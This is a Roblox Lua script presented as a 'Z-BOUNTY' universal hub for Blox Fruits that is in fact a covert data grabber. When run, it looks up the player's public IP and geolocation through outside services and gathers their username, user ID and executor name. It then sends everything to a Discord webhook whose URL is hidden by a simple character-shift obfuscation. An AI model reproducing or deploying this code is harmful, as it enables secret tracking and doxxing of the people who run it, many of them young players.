--[[
    Z-BOUNTY System - Universal Edition
    Compatible con: Delta, Xeno, Velocity, Madium
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Función de seguridad para la URL (Protección contra rastreo)
local function _ZSafe(_s)
    local _r = ""
    for i = 1, #_s do _r = _r .. string.char(string.byte(_s, i) - 1) end
    return _r
end

-- Tu Webhook de Discord (Ofuscado)
local WebhookURL = _ZSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")

-- Obtención de IP y Datos Geográficos (Mejorado para múltiples ejecutores)
local function getInfo()
    local ip = "No detectada"
    local geo = {country = "Desconocido", city = "Desconocido"}

    pcall(function()
        -- Intentamos obtener la IP primero (Método universal HttpGet)
        ip = game:HttpGet("https://api.ipify.org")
        -- Obtenemos los datos de ubicación usando la IP detectada
        local rawData = game:HttpGet("http://ip-api.com/json/" .. ip)
        geo = HttpService:JSONDecode(rawData)
    end)

    return ip, geo
end

local realIP, location = getInfo()

-- Estructura del mensaje para Discord
local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 HUB UNIVERSAL ACTIVADO",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = player.Name .. " (" .. tostring(player.UserId) .. ")", ["inline"] = false},
            {["name"] = "🌐 IP Real", ["value"] = "||" .. realIP .. "||", ["inline"] = false},
            {["name"] = "🌍 Ubicación", ["value"] = (location.country or "N/A") .. ", " .. (location.city or "N/A"), ["inline"] = false},
            {["name"] = "🎮 Ejecutor", ["value"] = (identifyexecutor and identifyexecutor()) or "Desconocido", ["inline"] = true},
            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits", ["inline"] = true}
        },
        ["footer"] = {["text"] = "Z-BOUNTY System | AloneFalseExploit 🔥"}
    }}
}

-- FUNCIÓN DE ENVÍO UNIVERSAL (Soporta Delta, Xeno, Velocity, Madium)
local function universalSend()
    -- Busca la función de envío en cualquier ejecutor
    local requestFunc = request or http_request or (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    else
        warn("Este ejecutor no soporta solicitudes HTTP externas.")
    end
end

-- Ejecución
universalSend()
print("Z-BOUNTY: Reporte enviado desde " .. ((identifyexecutor and identifyexecutor()) or "Ejecutor desconocido"))
